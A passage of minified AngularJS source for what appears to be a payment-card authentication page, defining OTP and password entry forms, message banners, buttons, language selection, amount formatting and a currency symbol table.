ENT_SUCCESS_MESSAGE",headerOrdinal:26,textOrdinal:27,messageLevel:MessageLevel.SUCCESS,displayType:DisplayType.FINAL},BAD_OTP:{defaultHeader:"BAD_OTP_HEADING",defaultText:"BAD_OTP_MESSAGE",headerOrdinal:28,textOrdinal:29,messageLevel:MessageLevel.ERROR,displayType:DisplayType.CLOSABLE},SESSION_EXPIRED:{defaultHeader:"SESSION_EXPIRED_HEADING",defaultText:"SESSION_EXPIRED_MESSAGE",headerOrdinal:30,textOrdinal:31,messageLevel:MessageLevel.ERROR,displayType:DisplayType.FINAL},TECHNICAL_ERROR:{defaultHeader:"TECHNICAL_ERROR_HEADING",defaultText:"TECHNICAL_ERROR_MESSAGE",headerOrdinal:32,textOrdinal:33,messageLevel:MessageLevel.ERROR,displayType:DisplayType.FINAL},OTP_RESEND:{defaultHeader:"OTP_RESEND_HEADING",defaultText:"OTP_RESEND_MESSAGE",headerOrdinal:34,textOrdinal:35,messageLevel:MessageLevel.WARNING,displayType:DisplayType.WAITING},OTP_SENDING:{defaultHeader:"SENDING_HEADING",defaultText:"SENDING_MESSAGE",headerOrdinal:36,textOrdinal:37,messageLevel:MessageLevel.WARNING,displayType:DisplayType.WAITING},REFRESH_SESSION:{defaultHeader:"REFRESH_SESSION_HEADING",defaultText:"REFRESH_SESSION_MESSAGE",headerOrdinal:43,textOrdinal:44,messageLevel:MessageLevel.WARNING,displayType:DisplayType.WAITING},REFRESH_SESSION_CHANGED:{defaultHeader:"REFRESH_SESSION_CHANGED_HEADING",defaultText:"REFRESH_SESSION_CHANGED_MESSAGE",headerOrdinal:45,textOrdinal:46,messageLevel:MessageLevel.INFO,displayType:DisplayType.CLOSABLE},REFRESH_SESSION_UNCHANGED:{defaultHeader:"REFRESH_SESSION_UNCHANGED_HEADING",defaultText:"REFRESH_SESSION_UNCHANGED_MESSAGE",headerOrdinal:47,textOrdinal:48,messageLevel:MessageLevel.INFO,displayType:DisplayType.CLOSABLE},BACKUP_REFUSAL:{defaultHeader:"BACKUP_REFUSAL_HEADING",defaultText:"BACKUP_REFUSAL_MESSAGE",headerOrdinal:49,textOrdinal:50,messageLevel:MessageLevel.ERROR,displayType:DisplayType.FINAL},BACKUP_TRIGGERED:{defaultHeader:"BACKUP_TRIGGERED_HEADING",defaultText:"BACKUP_TRIGGERED_MESSAGE",headerOrdinal:51,textOrdinal:52,messageLevel:MessageLevel.WARNING,displayType:DisplayType.CLOSABLE},returnButtonAction:function(){},subscribe:function(scope,callback){var handler=$rootScope.$on("update-message-banner",callback);scope.$on("$destroy",handler)},setReturnButtonAction:function(action){this.returnButtonAction=action},displayMessage:function(heading,message,messageLevel,displayType){this.messageLevel=messageLevel,this.displayType=displayType,this.heading=heading,this.message=message,this.show=!0,$rootScope.$emit("update-message-banner")},setHeading:function(heading){this.headingOverridden=heading},setMessage:function(message){this.messageOverridden=message},hideMessage:function(){this.show=!1,$rootScope.$emit("update-message-banner")},closeButtonClicked:function(){$rootScope.$emit("close-button-clicked")},subscribeCloseButtonClicked:function(scope,callback){var handler=$rootScope.$on("close-button-clicked",callback);scope.$on("$destroy",handler)},display:function(network,means,pageType,messageType,_messageLevel,_displayType){var headingKey,messageKey,exists,messageLevel=_.isNil(_messageLevel)?messageType.messageLevel:_messageLevel,displayType=_.isNil(_displayType)?messageType.displayType:_displayType;(headingKey=_.isEmpty(this.headingOverridden)?_.join([network,means,pageType,messageType.headerOrdinal],"_"):this.headingOverridden,messageKey=_.isEmpty(this.messageOverridden)?_.join([network,means,pageType,messageType.textOrdinal],"_"):this.messageOverridden,!0===$rootScope.straightMode)?(headingKey=$replace(headingKey,["network","means","pageType"],[network,means,pageType]),messageKey=$replace(messageKey,["network","means","pageType"],[network,means,pageType]),exists=[$injector.get("$straightTranslate")(headingKey)===headingKey?$q.reject():$q.resolve(),$injector.get("$straightTranslate")(messageKey)===messageKey?$q.reject():$q.resolve()]):exists=[$injector.get("$translate")(headingKey),$injector.get("$translate")(messageKey)];$q.all(exists).then(function(){messageBanner.displayMessage(headingKey,messageKey,messageLevel,displayType)},function(){var defaultHeader=messageType.defaultHeader,defaultText=messageType.defaultText;"SENDING_HEADING"===messageType.defaultHeader&&(defaultHeader=_.join([means,defaultHeader],"_"),defaultText=_.join([means,defaultText],"_")),messageBanner.displayMessage(defaultHeader,defaultText,messageLevel,displayType)})}};return messageBanner}]),ACS_COMMONS.directive("messageBanner",function(){return{restrict:"E",scope:{headingAttr:"=?",messageAttr:"=?",displayType:"=?",messageLevel:"=?",backButton:"=?",closeButton:"=?",show:"=?",iconStyle:"=?"},templateUrl:"common/directives/MessageBanner/messageBanner.html",controller:"MessageBannerCtrl"}}),ACS_COMMONS.controller("MessageBannerCtrl",["$scope","CustomItems","MessageBanner","CustomTextsService",function($scope,CustomItems,MessageBanner,CustomTextsService){function updateDisplay(){$scope.heading=MessageBanner.heading,$scope.message=MessageBanner.message,_.isEmpty($scope.headingAttr)||(MessageBanner.setHeading($scope.headingAttr),$scope.heading=$scope.headingAttr),_.isEmpty($scope.messageAttr)||(MessageBanner.setMessage($scope.messageAttr),$scope.message=$scope.messageAttr),$scope.messageLevel=MessageBanner.messageLevel,$scope.style=MessageLevel.PROPERTIES[MessageBanner.messageLevel].style,$scope.displayType=MessageBanner.displayType,$scope.show=MessageBanner.show,$scope.unfolded=!0,$scope.iconStyle=MessageLevel.PROPERTIES[MessageBanner.messageLevel].iconStyle,$scope.returnButtonAction=function(){MessageBanner.returnButtonAction()},CustomTextsService.getTranslation($scope.backButton,!1,!0).then(function(){$scope.backButtonKey=$scope.backButton},function(){$scope.backButtonKey="BACK_BUTTON"}),CustomTextsService.getTranslation($scope.closeButton,!1,!0).then(function(){$scope.closeButtonKey=$scope.closeButton},function(){$scope.closeButtonKey="CLOSE_BUTTON"}),$scope.layoutData=CustomItems.getCustomPageLayout("MESSAGE_BANNER")}MessageBanner.subscribe($scope,function(){updateDisplay()}),updateDisplay(),$scope.showReturnButton=function(){return $scope.displayType==DisplayType.FINAL},$scope.showCloseButton=function(){return $scope.displayType==DisplayType.CLOSABLE},$scope.showSpinner=function(){return $scope.displayType==DisplayType.WAITING},$scope.toggleDisplay=function(){$scope.show=!$scope.show,MessageBanner.closeButtonClicked()},$scope.foldUnfold=function(){$scope.unfolded=!$scope.unfolded},$scope.fold=function(){$scope.unfolded=!1}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("otpForm",function(){return{restrict:"E",scope:{clearingOtpEnabled:"=?"},templateUrl:"common/directives/OTPForm/otpForm.html",controller:"OtpFormCtrl"}}),ACS_COMMONS.controller("OtpFormCtrl",["$scope","$rootScope","$sessionStorage","OtpRecorder","ValButton","$translate","$straightTranslate","OtpTooltips","OtpVerification",function($scope,$rootScope,$sessionStorage,OtpRecorder,ValButton,$translate,$straightTranslate,OtpTooltips,OtpVerification){OtpRecorder.onDisabledOtpInput($scope,function(){$scope.input.disabled=OtpRecorder.disabled}),OtpRecorder.onClearOtpInput($scope,function(){$scope.input.otp=OtpRecorder.enteredOtp}),OtpRecorder.setClearingOtpEnabled($scope.clearingOtpEnabled),ValButton.setDisable(!0),$scope.input={otp:"",disabled:OtpRecorder.disabled,maxLength:OtpRecorder.defaultMaxLength},OtpVerification.isAllowedPatternConfigurationDefined()&&($scope.extractedDigit=OtpVerification.getIssuerConfigOtpMaxLength(),0<$scope.extractedDigit&&($scope.input.maxLength=$scope.extractedDigit));function tooltipsChange(){var straightTranslated=$straightTranslate("OTP_TOOLTIP");$scope.tooltipsValue="",_.isEqual(straightTranslated,"OTP_TOOLTIP")?$translate("OTP_TOOLTIP").then(function(value){$scope.tooltipsValue=OtpTooltips.generator(value,$scope.input.maxLength)}):$scope.tooltipsValue=OtpTooltips.generator(straightTranslated,$scope.input.maxLength)}tooltipsChange(),$rootScope.$on("$translateChangeSuccess",tooltipsChange),$scope.saveOtp=function(){_.isNil($scope.input.otp)||""===$scope.input.otp?ValButton.setDisable(!0):ValButton.setDisable(!1);for(var lastCharTab=OtpVerification.getLastCharactersEntered(OtpRecorder.enteredOtp,$scope.input.otp),i=0;i<lastCharTab.length;i++)OtpVerification.isOTPCharacterValid(lastCharTab[i])||($scope.input.otp=OtpVerification.removeLastCharEntered($scope.input.otp,lastCharTab[i]));OtpRecorder.enterOtp($scope.input.otp)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("pwdForm",function(){return{restrict:"E",scope:{minLength:"=?"},templateUrl:"common/directives/PWDForm/pwdForm.html",controller:"PwdFormCtrl"}}),ACS_COMMONS.controller("PwdFormCtrl",["$scope","$rootScope","OtpRecorder","ValButton","OtpVerification",function($scope,$rootScope,OtpRecorder,ValButton,OtpVerification){var minLengthValue=$scope.minLength;OtpRecorder.onDisabledOtpInput($scope,function(){$scope.input.disabled=OtpRecorder.disabled}),ValButton.setDisable(!0),$scope.input={otp:"",maxLength:25,disabled:OtpRecorder.disabled,minLength:minLengthValue},OtpVerification.isAllowedPatternConfigurationDefined()&&($scope.extractedDigit=OtpVerification.getIssuerConfigOtpMaxLength(),0<$scope.extractedDigit&&($scope.input.maxLength=$scope.extractedDigit)),$scope.saveOtp=function(){_.isNil($scope.input.otp)||""===$scope.input.otp?ValButton.setDisable(!0):ValButton.setDisable(!1),OtpRecorder.enterOtp($scope.input.otp)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("reSendOtp",function(){return{restrict:"E",scope:{iconclass:"=?",rsoLabel:"="},templateUrl:"common/directives/ReSendOTP/reSendOTP.html",controller:"ReSendOtpCtrl"}}),ACS_COMMONS.factory("ReSendOTP",["$rootScope",function($rootScope){return{rsoLabel:"",iconClass:"",disabled:!1,displayed:!0,action:function(){},subscribe:function(scope,callback){var handler=$rootScope.$on("re_send_OTP_button_event",callback);scope.$on("$destroy",handler)},setReSendOTPIconClass:function(iconclass){this.iconClass=iconclass,$rootScope.$emit("re_send_OTP_button_event")},setReSendOTPInfo:function(rsoLabel){this.rsoLabel=rsoLabel,$rootScope.$emit("re_send_OTP_button_event")},setReSendOTPAction:function(cnAction){this.action=cnAction,$rootScope.$emit("re_send_OTP_button_event")},setDisable:function(value){this.disabled=value,$rootScope.$emit("re_send_OTP_button_event")},setDisplay:function(value){this.displayed=value,$rootScope.$emit("re_send_OTP_button_event")}}}]),ACS_COMMONS.controller("ReSendOtpCtrl",["$scope","$rootScope","$state","$timeout","ReSendOTP",function($scope,$rootScope,$state,$timeout,ReSendOTP){function initButton(){$scope.rsoLabel||($scope.rsoLabel=ReSendOTP.rsoLabel),$scope.iconclass||($scope.iconclass=ReSendOTP.iconClass),$scope.disabled=ReSendOTP.disabled,$scope.displayed=ReSendOTP.displayed}initButton(),ReSendOTP.subscribe($scope,function(){initButton()}),$scope.reSendOTP=ReSendOTP.action,$scope.reSendOTPAction=function(){$scope.reSendOTP()}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("refreshPhoneNumber",function(){return{restrict:"E",scope:{tooltipLabel:"=?",infoLabel:"=?"},templateUrl:"common/directives/RefreshPhoneNumber/refreshPhoneNumber.html",controller:"RefreshPhoneNumberCtrl"}}),ACS_COMMONS.factory("RefreshPhoneNumber",["$rootScope",function($rootScope){return{displayed:!0,disabled:!1,action:function(){},TOOLTIP:{dynamicKey:"network_means_ALL_105",defaultText:"REFRESH_PHONE_NUMBER_TOOLTIP",textOrdinal:105},INFO_LABEL:{dynamicKey:"network_means_ALL_106",defaultText:"REFRESH_PHONE_NUMBER_INFO_LABEL",textOrdinal:106},subscribe:function(scope,callback){var handler=$rootScope.$on("update_refresh_phone_number",callback);scope.$on("$destroy",handler)},setRefreshButtonAction:function(refreshAction){this.action=refreshAction,$rootScope.$emit("update_refresh_phone_number")},setDisplay:function(value){this.displayed=value,$rootScope.$emit("update_refresh_phone_number")},setDisable:function(value){this.disabled=value,$rootScope.$emit("update_refresh_phone_number")}}}]),ACS_COMMONS.controller("RefreshPhoneNumberCtrl",["$scope","$rootScope","RefreshPhoneNumber","CustomTextsService",function($scope,$rootScope,RefreshPhoneNumber,CustomTextsService){function updateDisplay(){$scope.displayed=RefreshPhoneNumber.displayed,$scope.disabled=RefreshPhoneNumber.disabled,CustomTextsService.getTranslation($scope.tooltipLabel,!1,!0).then(function(){$scope.tooltipKey=$scope.tooltipLabel},function(){$scope.tooltipKey=RefreshPhoneNumber.TOOLTIP.defaultText}),void 0!==$scope.infoLabel&&CustomTextsService.getTranslation($scope.infoLabel,!1,!0).then(function(){$scope.infoLabelKey=$scope.infoLabel},function(){$scope.infoLabelKey=RefreshPhoneNumber.INFO_LABEL.defaultText})}updateDisplay(),RefreshPhoneNumber.subscribe($scope,function(){updateDisplay()}),$rootScope.$on("$translateChangeSuccess",function(){updateDisplay()}),$scope.refreshPhoneNumber=function(){0==RefreshPhoneNumber.disabled&&(RefreshPhoneNumber.setDisable(!0),RefreshPhoneNumber.action())}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("sideMenu",function(){return{restrict:"E",scope:{menuItems:"=?",menuTitle:"=?",showRefreshPhone:"=?",showRefreshPhoneInfo:"=?"},templateUrl:"common/directives/SideMenu/sideMenu.html",controller:"SideMenuCtrl"}});var MenuItemType=Object.freeze({RAW_TEXT:0,TRANSLATABLE:1,DEVICE:2,DATE:3,AMOUNT:4});ACS_COMMONS.factory("SideMenu",["$rootScope","$translate","$dateFormat","$amountFormat","$injector","$q","LOCALES",function($rootScope,$translate,$dateFormat,$amountFormat,$injector,$q,LOCALES){return{menuItems:[],MERCHANT_LABEL:{defaultText:"MERCHANT_LABEL",textOrdinal:100},AMOUNT_LABEL:{defaultText:"AMOUNT_LABEL",textOrdinal:101},DATE_LABEL:{defaultText:"DATE_LABEL",textOrdinal:102},CARD_NB_LABEL:{defaultText:"CARD_NB_LABEL",textOrdinal:103},SELECTED_DEVICE_MENU_LABEL:{defaultText:"means_SELECTED_DEVICE_MENU_LABEL",textOrdinal:104},transformMenuItem:function(menuItem,callback){var returnItem=menuItem;if(menuItem&&menuItem.hasOwnProperty("label")){var key=_.join([menuItem.data.network,menuItem.data.means,"ALL",menuItem.label.textOrdinal],"_");(!0===$rootScope.straightMode?$injector.get("$straightTranslate")(key)===key?$q.reject():$q.resolve():$injector.get("$translate")(key)).then(function(){returnItem.labelKey=key},function(){returnItem.labelKey=menuItem.label.defaultText}).finally(function(){$rootScope.$emit("update-side-menu-event")})}if(menuItem&&menuItem.hasOwnProperty("type")&&menuItem.type!==MenuItemType.RAW_TEXT&&menuItem.type!==MenuItemType.DEVICE){if(menuItem.type===MenuItemType.TRANSLATABLE)$translate(menuItem.value).then(function(translation){returnItem.value=translation,callback(this,returnItem)},function(translationId){returnItem.value=translationId,callback(this,returnItem)});else if(menuItem.type===MenuItemType.DATE){var language=$translate.proposedLanguage()||$translate.use();returnItem.value=$dateFormat.format(menuItem.data.rawValue,menuItem.data.format,menuItem.data.dateFormatMoment,language,menuItem.data.timeZone),moment.tz.zone(menuItem.data.timeZone)&&(returnItem.value=returnItem.value+" "+menuItem.data.timeZone),callback(this,returnItem)}else if(menuItem.type===MenuItemType.AMOUNT){language=$translate.proposedLanguage()||$translate.use();if(LOCALES.availableLocales.hasOwnProperty(language)){var amountFormat=LOCALES.availableLocales[language].amountFormat;returnItem.value=$amountFormat.format(menuItem.data.amount,menuItem.data.exponent,menuItem.data.currency,amountFormat.thousand,amountFormat.decimal,amountFormat.format,void 0,menuItem.data.useAlphaCurrencySymbol,menuItem.data.currencySymbolPosition,menuItem.data.decimalDelimiter,menuItem.data.thousandDelimiter)}callback(this,returnItem)}}else callback(this,returnItem)},subscribe:function(scope,callback){var handler=$rootScope.$on("update-side-menu-event",callback);scope.$on("$destroy",handler)},replaceMenuItems:function(newItems){this.menuItems.splice.apply(this.menuItems,[0,newItems.length].concat(newItems)),$rootScope.$emit("update-side-menu-event")},addMenuItem:function(menuItem){this.transformMenuItem(menuItem,function(sideMenu,transformedItem){sideMenu.menuItems.push(transformedItem),$rootScope.$emit("update-side-menu-event")})},popMenuItem:function(){this.menuItems.pop(),$rootScope.$emit("update-side-menu-event")},removeDeviceItem:function(){for(var i=0;i<this.menuItems.length;i++)this.menuItems[i].hasOwnProperty("type")&&this.menuItems[i].type===MenuItemType.DEVICE&&this.menuItems.splice.apply(this.menuItems,[i,1])},refreshMenuItemsFormats:function(index){index=index||0,this.transformMenuItem(this.menuItems[index],function(sideMenu,transformedItem){sideMenu.menuItems[index]=transformedItem,index<sideMenu.menuItems.length-1?(index++,sideMenu.refreshMenuItemsFormats(index)):$rootScope.$emit("update-side-menu-event")})}}}]),ACS_COMMONS.controller("SideMenuCtrl",["$rootScope","$scope","SideMenu","RefreshPhoneNumber",function($rootScope,$scope,SideMenu,RefreshPhoneNumber){$scope.showRefreshPhone||($scope.showRefreshPhone=!1),$scope.menuItems?SideMenu.menuItems=$scope.menuItems:SideMenu.menuItems&&(SideMenu.refreshMenuItemsFormats(),$scope.menuItems=SideMenu.menuItems),SideMenu.subscribe($scope,function(){$scope.menuItems=SideMenu.menuItems}),$rootScope.$on("$translateChangeSuccess",function(){SideMenu.refreshMenuItemsFormats()}),$scope.showMenuTitle=function(){return $scope.menuTitle&&0!==$scope.menuTitle.length},$scope.showRefreshPhoneButton=function(type){var show=type===MenuItemType.DEVICE&&$scope.showRefreshPhone;return show&&($scope.tooltipTextKey=RefreshPhoneNumber.TOOLTIP.dynamicKey,$scope.showRefreshPhoneInfo&&($scope.infoLabel=RefreshPhoneNumber.INFO_LABEL.dynamicKey)),show}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("spinner",function(){var defaultOpts={lines:10,length:10,width:5,radius:7,scale:1,corners:1,color:"#FFF",opacity:.25,rotate:0,direction:1,speed:1,trail:60,fps:20,zIndex:0,className:"spinner",top:"25px",left:"50%",shadow:!1,hwaccel:!1,position:"relative"};return{scope:{spinner:"=?"},link:function(scope,element,attr){scope.spinner?scope.spinnerObject=new Spinner(scope.spinner):scope.spinnerObject=new Spinner(defaultOpts),scope.spinnerObject.spin(element[0])}}}),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("switchMeansButton",function(){return{restrict:"E",scope:{means:"=?",customImageEnabled:"=?"},templateUrl:"common/directives/SwitchMeansButton/switchMeansButton.html",controller:"SwitchMeansButtonCtrl"}}),ACS_COMMONS.factory("SwitchMeansButton",["$rootScope","$injector","$q",function($rootScope,$injector,$q){var changeMeansLink={mean:"",changeMeansLabel:"",disabled:!1,displayed:!1,SWITCH_MEANS_LABEL:{defaultText:"SWITCH_MEANS_LABEL",textOrdinal:10},MISSING_DEVICE:{defaultText:"MISSING_DEVICE",textOrdinal:11},SWITCH_MEANS_TEXT_AND_IMAGE:{textOrdinal:9,imageSuffix:"IMAGE_DATA"},switchMeansAction:function(){},subscribe:function(scope,callback){var handler=$rootScope.$on("update_change_mean_link_event",callback);scope.$on("$destroy",handler)},setDisable:function(value){this.disabled=value,$rootScope.$emit("update_change_mean_link_event")},setDisplay:function(value){this.displayed=value,$rootScope.$emit("update_change_mean_link_event")},subscribeClicked:function(scope,callback){var handler=$rootScope.$on("switch-means-button-clicked",callback);scope.$on("$destroy",handler)},clicked:function(){$rootScope.$emit("switch-means-button-clicked")},setSwitchMeansButtonInfo:function(currentMean,network,means,pageType,changeMeansLabel){this.mean=currentMean;var key=_.join([network,means,pageType,changeMeansLabel.textOrdinal],"_");(!0===$rootScope.straightMode?$injector.get("$straightTranslate")(key)===key?$q.reject():$q.resolve():$injector.get("$translate")(key)).then(function(){changeMeansLink.changeMeansLabel=key},function(){"MISSING_DEVICE"===changeMeansLabel.defaultText||"SWITCH_MEANS_LABEL"===changeMeansLabel.defaultText?changeMeansLink.changeMeansLabel=_.join([means,changeMeansLabel.defaultText],"_"):changeMeansLink.changeMeansLabel=changeMeansLabel.defaultText}).finally(function(){$rootScope.$emit("update_change_mean_link_event")})},setSwitchMeansButtonAction:function(action){this.switchMeansAction=action}};return changeMeansLink}]),ACS_COMMONS.controller("SwitchMeansButtonCtrl",["$scope","$rootScope","SwitchMeansButton","CustomTextsService",function($scope,$rootScope,SwitchMeansButton,CustomTextsService){$scope.customImageEnabled||($scope.customImageEnabled=!1),$scope.customImageIsEnabled=function(){return $scope.customImageEnabled};function updateDisplay(){$scope.changeMeansKey||($scope.changeMeansKey=SwitchMeansButton.changeMeansLabel),$scope.means||($scope.means=SwitchMeansButton.mean),$scope.disabled=SwitchMeansButton.disabled,$scope.displayed=SwitchMeansButton.displayed,$scope.customImageEnabled&&($scope.changeMeansKey=_.join(["network",$scope.means,"pageType",SwitchMeansButton.SWITCH_MEANS_TEXT_AND_IMAGE.textOrdinal],"_"),CustomTextsService.getTranslation($scope.changeMeansKey,!1,!0).then(function(){$scope.changeMeansLabel=$scope.changeMeansKey},function(){$scope.changeMeansLabel=$scope.means}),$scope.changeMeansImage=_.join([$scope.changeMeansKey,SwitchMeansButton.SWITCH_MEANS_TEXT_AND_IMAGE.imageSuffix],"_"),$scope.switchMeansButtonImageId="switch-means-"+$scope.means.toLowerCase()+"-img")}updateDisplay(),SwitchMeansButton.subscribe($scope,function(){updateDisplay()}),$rootScope.$on("$translateChangeSuccess",function(){updateDisplay()}),$scope.changeMeans=function(){SwitchMeansButton.clicked(),SwitchMeansButton.switchMeansAction($scope.means)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("valButton",function(){return{restrict:"E",scope:{action:"=?",valLabel:"=?"},templateUrl:"common/directives/ValButton/valButton.html",controller:"ValButtonCtrl"}}),ACS_COMMONS.factory("ValButton",["$rootScope",function($rootScope){return{valLabel:"",disabled:!0,action:null,subscribe:function(scope,callback){var handler=$rootScope.$on("update_validate_button_event",callback);scope.$on("$destroy",handler)},setValButtonInfo:function(valLabel){this.valLabel=valLabel,$rootScope.$emit("update_validate_button_event")},setAction:function(action){this.action=action,$rootScope.$emit("update_validate_button_event")},setDisable:function(value){this.disabled=value,$rootScope.$emit("update_validate_button_event")}}}]),ACS_COMMONS.controller("ValButtonCtrl",["$scope","ValButton",function($scope,ValButton){function initButton(){$scope.valLabel||($scope.valLabel=ValButton.valLabel),$scope.disabled=ValButton.disabled,$scope.action=ValButton.action}initButton(),ValButton.subscribe($scope,function(){initButton()})}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).directive("i18n",function(){return{restrict:"E",scope:{locales:"=?",selectBoxStyleEnabled:"=?",i18nLabel:"=?"},templateUrl:"common/directives/i18n/i18n.html",controller:"I18nCtrl"}}),ACS_COMMONS.factory("I18N",["$rootScope",function($rootScope){return{locales:[],defaultLocale:"",forcedShow:!1,subscribe:function(scope,callback){var handler=$rootScope.$on("update_locales_list_event",callback);scope.$on("$destroy",handler)},setLocales:function(backupLocales,defaultLocale){var bcLocales=backupLocales.slice(0);bcLocales||0<bcLocales.length?(this.locales=[],defaultLocale&&(-1==bcLocales.indexOf(defaultLocale)&&bcLocales.unshift(defaultLocale),this.defaultLocale=defaultLocale),this.locales.splice.apply(this.locales,[0,bcLocales.length].concat(bcLocales.filter(function(value){return 0!=value.trim().length}))),$rootScope.$emit("update_locales_list_event")):defaultLocale&&(this.defaultLocale=defaultLocale,$rootScope.$emit("update_locales_list_event"))},forceShow:function(){this.forcedShow=!0,$rootScope.$emit("update_locales_list_event")},subscribeClicked:function(scope,callback){var handler=$rootScope.$on("i18n-button-clicked",callback);scope.$on("$destroy",handler)},clicked:function(){$rootScope.$emit("i18n-button-clicked")}}}]),ACS_COMMONS.controller("I18nCtrl",["$rootScope","$scope","$translate","$localStorage","I18N",function($rootScope,$scope,$translate,$localStorage,I18N){$scope.shown=!1,I18N.subscribe($scope,function(){I18N.locales&&0<I18N.locales.length&&($scope.locales=I18N.locales),I18N.defaultLocale&&""!==I18N.defaultLocale&&changeLanguage(I18N.defaultLocale),$scope.shown=1<$scope.locales.length}),$scope.getCurrentLanguage=function(){return!0===$rootScope.straightMode&&$localStorage.straightTLLocale?$localStorage.straightTLLocale:$translate.use()},$scope.selectBoxStyleEnabled||($scope.selectBoxStyleEnabled=!1),$scope.selectBoxStyleIsEnabled=function(){return $scope.selectBoxStyleEnabled},$scope.isCurrentLanguage=function(code){var currentLanguage=$scope.getCurrentLanguage();return!!currentLanguage&&currentLanguage.toLowerCase()===code.toLowerCase()},$scope.changeLanguage=function(code){I18N.clicked(),changeLanguage(code)};var changeLanguage=function(code){$rootScope.straightMode?($localStorage.straightTLLocale=code,$rootScope.$emit("$translateChangeSuccess")):$translate.use(code)};$scope.locales&&0!==$scope.locales.length||(I18N.locales||0!==I18N.locales.length?($scope.locales=I18N.locales,$scope.shown=1<$scope.locales.length,I18N.defaultLocale&&""!==I18N.defaultLocale&&changeLanguage($scope.getCurrentLanguage())):($scope.locales=$translate.getAvailableLanguageKeys(),I18N.locales=$scope.locales,$scope.shown=1<$scope.locales.length&&I18N.forcedShow)),$scope.selectBoxStyleEnabled&&($scope.selectedlanguage=I18N.locales[0])}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("$amountFormat",["$currencySymbols",function($currencySymbols){return{format:function(amount,exponent,currency,thousands,decimals,format,encodeSymbol,useAlphaCurrencySymbol,currencySymbolPosition,decimalDelimiter,thousandDelimiter){if(accounting){var args=[];args.push(amount/Math.pow(10,exponent));var currencySymbol=$currencySymbols.getSymbolFromCurrency(currency);return useAlphaCurrencySymbol&&(currencySymbol=$currencySymbols.getAlphaFromCurrency(currency)),"LEFT"===currencySymbolPosition?format="%s %v":"RIGHT"===currencySymbolPosition&&(format="%v %s"),encodeSymbol&&(currencySymbol=$currencySymbols.encodeToHtml(currencySymbol)),decimalDelimiter&&(decimals=decimalDelimiter),thousandDelimiter&&(thousands=thousandDelimiter),args.push(currencySymbol),args.push(exponent),args.push(thousands),args.push(decimals),args.push(format),accounting.formatMoney.apply(null,args)}return amount+$currencySymbols.getSymbolFromCurrency(currency)}}}]),ACS_COMMONS.filter("formatAmount",["$amountFormat",function($amountFormat){return function(amount,exponent,currency,thousands,decimals,format,encodeSymbol){return $amountFormat.format(amount,exponent,currency,thousands,decimals,format,encodeSymbol)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("$currencySymbols",function(){var symbolCurrencyMap={ALL:"L",971:"؋","032":"$",533:"ƒ","036":"$",AZN:"₼",944:"$","052":"$",974:"p.","084":"BZ$","060":"$","068":"Bs.",977:"KM","072":"P",975:"лв",986:"R$","096":"$",116:"៛",124:"$",136:"$",152:"$",156:"¥",170:"$",188:"₡",191:"kn",192:"₱",203:"Kč",208:"kr",214:"RD$",951:"$",818:"£",222:"$",978:"€",238:"£",242:"$",936:"₵",292:"£",320:"Q",328:"$",340:"L",344:"$",348:"Ft",352:"kr",356:"₹",360:"Rp",364:"﷼",376:"₪",388:"J$",392:"¥",404:"KSh",398:"₸",408:"₩",410:"₩",417:"лв",418:"₭",422:"£",430:"$",807:"ден",458:"RM",480:"₨",484:"$",496:"₮",943:"MT",516:"$",524:"₨",532:"ƒ",554:"$",558:"C$",566:"₦",578:"kr",512:"﷼",586:"₨",590:"B/.",600:"₲",604:"S/.",608:"₱",985:"zł",634:"﷼",946:"lei",643:"₽",654:"£",682:"﷼",941:"Дин.",690:"₨",702:"$","090":"$",706:"S",710:"R",144:"₨",752:"kr",756:"CHF",968:"$",760:"£",834:"TSh",901:"NT$",764:"฿",780:"TT$",949:"₺",800:"USh",980:"₴",826:"£",840:"$",858:"$U",860:"лв",937:"Bs",704:"₫",886:"﷼",932:"Z$",981:"₾",504:".د.م",368:"د.ع","048":".د.ب",784:"د.إ"},aplhaNumericMap={AFN:"971",EUR:"978",ALL:"008",DZD:"012",USD:"840",AOA:"973",XCD:"951",ARS:"032",AMD:"051",AWG:"533",AUD:"036",AZN:"944",BSD:"044",BHD:"048",BDT:"050",BBD:"052",BYN:"933",BYR:"974",BZD:"084",XOF:"952",BMD:"060",INR:"356",BTN:"064",BOB:"068",BOV:"984",BAM:"977",BWP:"072",NOK:"578",BRL:"986",BND:"096",BGN:"975",BIF:"108",CVE:"132",KHR:"116",XAF:"950",CAD:"124",KYD:"136",CLP:"152",CLF:"990",CNY:"156",COP:"170",COU:"970",KMF:"174",CDF:"976",NZD:"554",CRC:"188",HRK:"191",CUP:"192",CUC:"931",ANG:"532",CZK:"203",DKK:"208",DJF:"262",DOP:"214",EGP:"818",SVC:"222",ERN:"232",ETB:"230",FKP:"238",FJD:"242",XPF:"953",GMD:"270",GEL:"981",GHS:"936",GIP:"292",GTQ:"320",GBP:"826",GNF:"324",GYD:"328",HTG:"332",HNL:"340",HKD:"344",HUF:"348",ISK:"352",IDR:"360",XDR:"960",IRR:"364",IQD:"368",ILS:"376",JMD:"388",JPY:"392",JOD:"400",KZT:"398",KES:"404",KPW:"408",KRW:"410",KWD:"414",KGS:"417",LAK:"418",LBP:"422",LSL:"426",ZAR:"710",LRD:"430",LYD:"434",CHF:"756",MOP:"446",MKD:"807",MGA:"969",MWK:"454",MYR:"458",MVR:"462",MRO:"478",MUR:"480",XUA:"965",MXN:"484",MXV:"979",MDL:"498",MNT:"496",MAD:"504",MZN:"943",MMK:"104",NAD:"516",NPR:"524",NIO:"558",NGN:"566",OMR:"512",PKR:"586",PAB:"590",PGK:"598",PYG:"600",PEN:"604",PHP:"608",PLN:"985",QAR:"634",RON:"946",RUB:"643",RWF:"646",SHP:"654",WST:"882",STD:"678",SAR:"682",RSD:"941",SCR:"690",SLL:"694",SGD:"702",XSU:"994",SBD:"090",SOS:"706",SSP:"728",LKR:"144",SDG:"938",SRD:"968",SZL:"748",SEK:"752",CHE:"947",CHW:"948",SYP:"760",TWD:"901",TJS:"972",TZS:"834",THB:"764",TOP:"776",TTD:"780",TND:"788",TRY:"949",TMT:"934",UG